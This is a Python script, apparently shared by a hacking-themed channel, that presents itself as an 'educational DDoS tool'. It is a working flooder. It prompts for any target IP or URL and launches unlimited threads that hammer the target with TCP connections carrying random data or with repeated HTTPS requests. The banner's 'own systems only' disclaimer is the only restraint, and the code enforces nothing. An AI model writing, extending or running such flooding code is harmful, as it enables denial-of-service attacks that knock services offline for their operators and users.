import socket
import threading
import requests
import random
import time
import os

# Function to clear the terminal screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# TCP flood function
def tcp_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            data = random._urandom(1024)
            sock.send(data)
            sock.close()
            print(f"\033[92m[TCP] Packet sent to {ip}:{port}")  # Green color for success
        except:
            print(f"\033[91m[TCP] Failed to send packet to {ip}:{port}")  # Red color for failure

# HTTPS flood function
def https_flood(url):
    while True:
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0',
                    'Chrome/91.0',
                    'Safari/537.36',
                    'Opera/9.80'
                ])
            }
            response = requests.get(url, headers=headers)
            print(f"\033[92m[HTTPS] Request sent to {url} | Status: {response.status_code}")  # Green color for success
        except:
            print(f"\033[91m[HTTPS] Failed to send request to {url}")  # Red color for failure

def main():
    clear_screen()  # Clear the screen before starting

    # Show the updated banner with your message
    print(f"\033[93m=== StormRage - Educational DDoS Tool ===")  # Yellow color for the intro
    print(f"\033[93m⚠️ Use for testing on your own systems only!\n")  # Yellow color for the disclaimer
    print(f"\033[93m---Created by Alok Thakur---\nSubscribe to channel--- Firewall Breaker")  # Yellow color for your message

    mode = input(f"\033[96mAttack mode (tcp/https): ").lower()  # Cyan color for user input prompt

    if mode == "tcp":
        ip = input(f"\033[96mTarget IP: ")  # Cyan color for user input
        port = int(input(f"\033[96mPort (default 80): ") or "80")  # Cyan color for user input
        threads = int(input(f"\033[96mNumber of Threads: "))  # Cyan color for user input
        for _ in range(threads):
            thread = threading.Thread(target=tcp_flood, args=(ip, port))
            thread.start()

    elif mode == "https":
        url = input(f"\033[96mTarget URL (with https://): ")  # Cyan color for user input
        threads = int(input(f"\033[96mNumber of Threads: "))  # Cyan color for user input
        for _ in range(threads):
            thread = threading.Thread(target=https_flood, args=(url,))
            thread.start()

    else:
        print(f"\033[91mInvalid mode. Use 'tcp' or 'https'.")  # Red color for error

if __name__ == "__main__":
    main()
